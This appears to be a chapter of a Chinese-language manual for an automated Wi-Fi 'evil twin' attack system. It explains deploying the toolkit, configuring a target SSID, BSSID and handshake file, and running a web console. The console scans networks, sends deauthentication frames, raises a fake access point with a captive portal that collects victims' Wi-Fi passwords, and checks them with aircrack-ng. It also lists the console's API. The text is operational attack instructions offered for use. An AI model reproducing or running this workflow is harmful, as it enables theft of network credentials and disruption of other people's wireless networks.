# 第 5 章 自动化系统：部署与使用

> 本章把第 4 章的四步串成**一键自动化系统**，提供 Web 控制台（手机/电脑浏览器均可操作）。

## 5.1 系统架构

```
┌──────────────────────────────────────────────────────┐
│         Web 控制台 evil_control.py (端口 8090)         │
│   /api/scan 扫描 · /api/start 攻击 · /api/stop 停止    │
│   /api/verify 密码验证 · /api/status 状态轮询          │
└───────┬──────────────────────────────┬───────────────┘
        │ systemd-run 启动三件套         │ aircrack-ng 验证
┌───────▼────────┐  ┌──────────────────▼──────────────┐
│ evil-hostapd   │  │ 用真实握手 hccapx 验证捕获密码     │
│ evil-dnsmasq   │  │ KEY FOUND → 通过 → 自动关假 AP     │
│ evil-portal    │  └─────────────────────────────────┘
└────────────────┘
```

## 5.2 部署

```bash
# 一键部署（装依赖 + Airgeddon + hostapd-mana + 配置）
sudo bash deploy/deploy.sh

# 编辑配置（最关键！）
sudo nano /opt/evil-twin/config.env

# 至少修改这两项:
export WIFI_IFACE="wlx90de80defb54"          # 你的 USB 网卡
export EVIL_HASHES="CMCC-gf7e:/opt/evil-twin/handshakes/gf7e.hccapx:C8:75:F4:40:D6:8A"
# EVIL_HASHES 格式: SSID:握手hccapx路径:AP的BSSID（多个用分号分隔）
```

**EVIL_HASHES 是密码自动验证的开关**：不配置则捕获后不验证（直接当成功）；配置后捕获密码会与真实握手比对。

## 5.3 启动控制台

```bash
sudo bash scripts/restart_control.sh
# 输出 evil-ctrl.service active 即成功
```

浏览器访问（任选可达的）：

| 场景 | 地址 |
|---|---|
| 同一局域网 | `http://<主机IP>:8090`（如 192.168.x.x） |
| 远程（装 Tailscale） | `http://<Tailscale-IP>:8090` |
| 本机 | `http://127.0.0.1:8090` |

## 5.4 攻击操作流程（7 步）

1. **扫描**：点「扫描 WiFi」→ 列表按信号排序显示附近网络
2. **选目标**：点目标行（SSID/BSSID/信道/加密/信号一目了然）
3. **开始攻击**：点「⚡ 开始攻击」，控制台自动执行：
   - 停残留服务 → 切监听 → 广播 deauth（约 6 秒）→ 配 10.0.0.1 → 启三件套
4. **等 10~15 秒**：假 AP 广播完成
5. **受害者操作**（你的测试手机）：断开 WiFi → 重新搜索 → 连**无锁的同名 WiFi**
6. **输密码**：自动弹认证页 → 输入密码 → 点击连接
7. **看结果**：控制台「最新捕获密码」实时显示 → 自动验证：
   - ✅ 正确 → 绿色徽章 → 4 秒后自动关闭假 AP
   - ❌ 错误 → 红色提示，受害者重新输入

## 5.5 界面功能说明

| 区域 | 内容 |
|---|---|
| 顶部状态 | 攻击状态灯（空闲/攻击中/错误）+ 目标徽章 |
| 附近 WiFi 列表 | 信号排序，点选目标 |
| 攻击目标卡片 | 所选目标详情 + 开始攻击按钮 |
| 最新捕获密码 | **只显示最近一条**捕获的密码 |
| 验证徽章 | 等待验证 / 验证通过 / 密码错误 |
| 历史记录 | **只记录验证通过的密码**，4 列：时间/WiFi/密码/设备（最近 5 条） |
| 已连接设备 | 连上假 AP 的设备 IP/设备名/MAC |
| 运行日志 | 全流程轨迹（排错看这里） |

## 5.6 API 参考（供二次开发）

```
GET  /              Web 界面
GET  /api/scan      扫描 → {"aps":[{ssid,bssid,channel,enc,signal}]}
GET  /api/status    状态 → {mode,target,captured,verify,history,clients,log}
POST /api/start     启动 → body {ssid,bssid,channel}
POST /api/verify    验密 → body {password} → {ok,note}
POST /api/stop      停止 → {ok}
```

## 5.7 停止与恢复

```bash
# 方式一：控制台「停止攻击」按钮
# 方式二：命令行
sudo bash scripts/restart_control.sh
```

停止流程：停三件套 → 恢复 systemd-resolved → 网卡恢复 managed → 清 10.0.0.1 地址。
